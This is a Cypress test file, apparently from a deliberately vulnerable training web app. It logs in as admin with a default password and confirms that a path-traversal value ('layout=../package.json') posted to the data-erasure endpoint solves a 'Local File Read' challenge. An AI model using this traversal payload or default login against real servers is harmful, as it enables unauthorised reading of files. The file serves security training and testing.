describe('/dataerasure', () => {
  beforeEach(() => {
    cy.login({ email: 'admin', password: 'admin123' })
  })

  describe('challenge "lfr"', () => {
    it('should be possible to perform local file read attack using the browser', () => {
      cy.window().then(async () => {
        const form = await (await fetch(`${Cypress.config('baseUrl')}/dataerasure`)).text()
        const csrfToken = /name="_csrf" value="([^"]+)"/.exec(form)?.[1] ?? ''
        const params = `layout=../package.json&_csrf=${csrfToken}`

        const response = await fetch(`${Cypress.config('baseUrl')}/dataerasure`, {
          method: 'POST',
          cache: 'no-cache',
          headers: {
            'Content-type': 'application/x-www-form-urlencoded',
            Origin: `${Cypress.config('baseUrl')}/`,
            Cookie: `token=${localStorage.getItem('token')}`
          },
          body: params
        })
        if (response.status === 200) {
          console.log('Success')
        }
      })
      cy.visit('/')
      cy.expectChallengeSolved({ challenge: 'Local File Read' })
    })
  })
})
